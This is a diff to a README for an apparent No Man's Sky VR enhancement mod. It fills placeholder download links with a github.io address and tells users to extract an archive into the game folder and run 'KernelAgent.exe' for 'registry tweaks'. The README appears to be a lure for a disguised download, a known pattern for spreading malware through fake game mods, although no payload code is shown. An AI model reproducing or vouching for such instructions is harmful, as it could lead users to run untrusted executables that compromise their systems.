@@ -2,13 +2,15 @@
 
 This mod improves the VR experience in No Man’s Sky with optimized settings, HUD scaling, motion smoothing tweaks, and controller mapping fixes for SteamVR and OpenXR. Designed for Quest 2/3, Index, and WMR headsets.
 
-[![Download VR Mod+](https://img.shields.io/badge/Download-NMS_VR_Mod+-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download VR Mod+](https://img.shields.io/badge/Download-NMS_VR_Mod+-blueviolet)](https://no-mans-sky-vr-mod-enhancer.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://no-mans-sky-vr-mod-enhancer.github.io/.github
+) section  
 2. 📁 **Extract contents** into the game root folder (e.g. `...\No Man's Sky\Binaries\`)  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to apply registry tweaks and enable VR override)  
 4. 🕶 Launch the game in SteamVR or OpenXR mode  
